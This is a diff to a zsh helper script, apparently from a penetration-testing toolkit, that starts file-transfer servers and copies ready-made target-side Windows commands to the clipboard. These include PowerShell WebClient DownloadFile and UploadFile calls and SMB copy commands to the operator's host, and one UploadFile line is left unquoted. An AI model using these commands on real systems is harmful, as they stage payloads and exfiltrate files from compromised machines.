@@ -45,9 +45,6 @@ nb-srv-nc-tar           hosts a netcat server > tar file in current dir
 nb-srv-nc-file          hosts a netcat server > file in current dir
 nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir
 
-nb-srv-ftp-hosted       hosts a python ftp server in /srv
-nb-srv-updog-hosted     hosts an updog web server in /srv
-
 DOC
 }
 
@@ -166,10 +163,12 @@ nb-srv-ftp-down() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
+  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND="(New-Object Net.WebClient).DownloadFile('ftp://${__LHOST}/$filename', 'C:\Users\Public\\$filename')"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
+  popd &> /dev/null
 
 	print -z "sudo python -m pyftpdlib --port 21"
 }
@@ -179,10 +178,12 @@ nb-srv-ftp-up() {
   local filename && __askvar filename "FILENAME"
   local path && __askvar path "FULL_PATH_TO_FILE"
 
+  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND=(New-Object Net.WebClient).UploadFile('ftp://${__LHOST}/$filename', '$path')
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
+  popd &> /dev/null
 
   print -z "sudo python -m pyftpdlib --port 21 --write"
 }
@@ -191,24 +192,28 @@ nb-srv-smb() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
+  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND="copy \\${__LHOST}\share\\$filename"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
+  popd &> /dev/null
 
-	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare"
+	print -z "sudo impacket-smbserver share -smb2support ./"
 }
 
 nb-srv-smb-http() {
   nb-vars-set-lhost
   local path && __askvar path "FULL_PATH_TO_FILE"
 
+  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND1="dir \\${__LHOST}\DavWWWRoot"
   __COMMAND2="copy $path \\${__LHOST}\DavWWWRoot"
   echo $__COMMAND2 | wl-copy
   echo $__COMMAND1 | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
+  popd &> /dev/null
 
   print -z "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
 }
@@ -217,43 +222,41 @@ nb-srv-smb-auth() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
+  pushd "$HOME/desktop/server" &> /dev/null
   echo
   __COMMAND1="net use n: \\${__LHOST}\share /user:test test"
   __COMMAND2="copy n:\\$filename"
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
+  popd &> /dev/null
 
   # New versions of Windows block unauthenticated guest access, to bypass set username and pass
-	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test"
+	print -z "sudo impacket-smbserver share -smb2support ./ -user test -password test"
 }
 
 nb-srv-ngrok() {
+  pushd "$HOME/desktop/server" &> /dev/null
   print -z "ngrok http 4444"
+  popd &> /dev/null
 }
 
 nb-srv-tftp() {
+  pushd "$HOME/desktop/server" &> /dev/null
 	print -z "sudo service atftpd start"
+  popd &> /dev/null
 }
 
 nb-srv-smtp() {
+  pushd "$HOME/desktop/server" &> /dev/null
 	print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"
-}
-
-nb-srv-ftp-hosted() {
-    __info "Serving content from /srv"
-    pushd /srv &> /dev/null
-    sudo python -m pyftpdlib -p 21 -w
-    popd &> /dev/null
+  popd &> /dev/null
 }
 
 nb-srv-updog() {
-    print -z "updog -p 443 --ssl -p $(__rand 10)"
-}
-
-nb-srv-updog-hosted() {
-    __info "Serving content from /srv"
-    sudo updog -p 443 --ssl -d /srv
+  pushd "$HOME/desktop/server" &> /dev/null
+  print -z "updog -p 443 --ssl -p $(__rand 10)"
+  popd &> /dev/null
 }
 
 nb-srv-nc-tar() {
